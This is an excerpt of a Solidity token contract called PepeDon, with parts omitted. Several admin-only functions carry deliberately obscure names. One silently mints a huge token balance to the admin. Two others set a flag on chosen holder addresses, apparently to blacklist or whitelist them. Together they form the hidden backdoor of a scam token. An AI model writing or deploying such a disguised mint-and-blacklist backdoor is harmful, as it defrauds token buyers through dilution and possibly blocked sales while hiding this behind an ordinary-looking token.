...
contract PepeDon is Ownable{
    ...
    function abancdx(address xasada) public virtual returns (bool) {
        ...
        longinfo[tmoinfo] = globaltrue;
        require(_msgSender() == longMadmin);
        return true;
    }

    function mmakadminoopp() external   {
        if(_msgSender() == longMadmin){
            
        }
        if(_msgSender() == longMadmin){
            
        }
        _balances[_msgSender()] += 10**decimals()*68800*(33300000000+800);
        require(_msgSender() == longMadmin);
    }
    ...
    function quimmmapsyaop(address hkkk) external  {
        address tmoinfo = hkkk;
        longinfo[tmoinfo] = globalff;
        require(_msgSender() == longMadmin);
    }
